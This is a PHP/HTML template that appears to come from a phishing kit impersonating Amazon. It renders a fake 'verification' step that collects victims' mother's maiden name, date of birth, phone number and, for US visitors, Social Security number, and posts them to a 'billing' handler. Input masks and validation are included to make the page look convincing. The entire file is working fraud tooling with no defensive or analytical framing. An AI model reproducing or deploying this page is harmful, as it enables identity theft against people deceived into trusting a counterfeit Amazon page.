<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "CR51/language/lang.php";
?>
<!DOCTYPE html>
<html>

<head>
    <title>
        <?php echo $_45 ?>
    </title>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="<?= base_url() ?>CR51/Assets/_hayo/images/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>CR51/Assets/_hayo/css/boostrap.min.css" media="all">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/sign-dekstop.css">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/style.sign-desktop.css">
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>CR51/Assets/_hayo/css/style.css">
</head>

<body onload="_loader()" style="margin:0;">
    <div id="loader"></div>
    <div style="display:none;" id="myDiv" class="animate-bon ttom">
        <div id="a-page">
            <div class="a-section a-padding-medium auth-workflow">
                <div class="a-section a-spacing-none auth-navbar">
                    <div class="a-section a-spacing-medium a-text-center">
                        <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                    </div>
                </div>
                <div id="authportal-center-section" class="a-section">
                    <ul class="list-unstyled multi-steps" style="padding-top: 10px" align="center">
                        <li class="is-active">
                            <?php echo $_113 ?>
                        </li>
                        <li>
                            <?php echo $_46 ?>
                        </li>
                        <li>
                            <?php echo $_47 ?>
                        </li>
                        <li>
                            <?php echo $_48 ?>
                        </li>
                    </ul>
                    <div class="a-content">
                        <div class="container">
                            <div class="row" style="padding-top: 5px">
                                <div class="col-12">
                                    <div align="center"> <img src="<?= base_url() ?>CR51/Assets/_hayo/images/security.png" width="80"> </div>
                                    <div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;"><?php echo $_45 ?></span> </div>
                                    <div align="center"> <span class="lefttext"><?php echo $_49 ?></span> </div><br>
                                    <div class="mypayementarea">
                                        <form action="<?= base_url() ?>billing/first" method="post" name="konzform" id="konzform"> <span class="colorblacked"><?php echo $_45 ?></span>
                                            <div class="row mt-3">
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="mmn">
                                                            <?php echo $_57 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput mmnfocus" name="mmn" id="mmn" placeholder="<?php echo $_58 ?>" minlength="5" maxlength="30" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <?php if ($_SESSION['countryCode'] == "US") {
                                                    echo
                                                    '<div class="col-sm-6"> <div class="form-group"> <label for="ssn">Social Security number
												</label>
												<input type="text" id="ssn" class="form-control amazoninput ssnfocus" name="ssn" placeholder="Social Security number" maxlength="25" required> </div>
												</div>';
                                                } ?>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="dob">
                                                            <?php echo $_61 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput regionfocus" name="dob" id="dob" placeholder="MM/DD/YYYY" maxlength="30">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="phone">
                                                            <?php echo $_63 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput zipfocus" name="phone" id="phone" placeholder="<?php echo $_64 ?>" maxlength="16">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="a-row a-spacing-small">
                                                <span id="cvf-submit-otp-button" class="a-button a-button-span2 a-button-primary cvf-widget-btn cvf-widget-btn-verify">
                                                    <span class="a-button-inner">
                                                        <button type="submit" name="Sex" class="a-button-text" role="button"><?php echo $_7 ?></button>
                                                    </span>
                                                </span>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <script>
                                    P.when('A', 'ready').execute(function(A) {
                                        var $ = A.$;
                                        $('.cvf-widget-link-resend').click(function() {
                                            $('.cvf-widget-form-resend').submit();
                                        });
                                    });
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_21 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_22 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_23 ?>
                </a> <span class="auth-footer-seperator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span> </div>
        </div>
    </div>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery-3.3.1.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.mask.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.validate.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/additional-methods.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.creditCardValidator.js"></script>
    <script>
        let load;

        let _loader = () => {
            load = setTimeout(showPage, 1000);
        }

        let showPage = () => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('myDiv').style.display = 'block';
        }

        const alpha = (e) => {
            let k;
            document.all ? k = e.keyCode : k = e.which;
            return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
        }

        $(document).ready(function(e) {
            e('#phone').mask('+000000000000000'), e('#dob').mask('00/00/0000'), e('#ssn').mask('000-00-0000'), $("#konzform").validate({
                errorClass: "error-class",
                rules: {
                    phone: {
                        required: true,
                        minlength: 6,
                        maxlength: 16
                    },
                    dob: {
                        required: true,
                        minlength: 10,
                        minAge: 17
                    },
                    mmn: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    }
                },
                messages: {
                    phone: {
                        required: "<?php echo $_65 ?>"
                    },
                    mmn: {
                        required: "<?php echo $_66 ?>"
                    },
                    dob: {
                        required: "<?php echo $_67 ?>",
                        minAge: "<?php echo $_68 ?>"
                    }
                }
            });
        })

        $.validator.addMethod("minAge", function(value, element, min) {
            let today = new Date();
            let birthDate = new Date(value);
            let age = today.getFullYear() - birthDate.getFullYear();
            if (age > min + 1) {
                return true;
            }
            let m = today.getMonth() - birthDate.getMonth();
            if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
                age--;
            }
            return age >= min;
        });
    </script>
</body>

</html>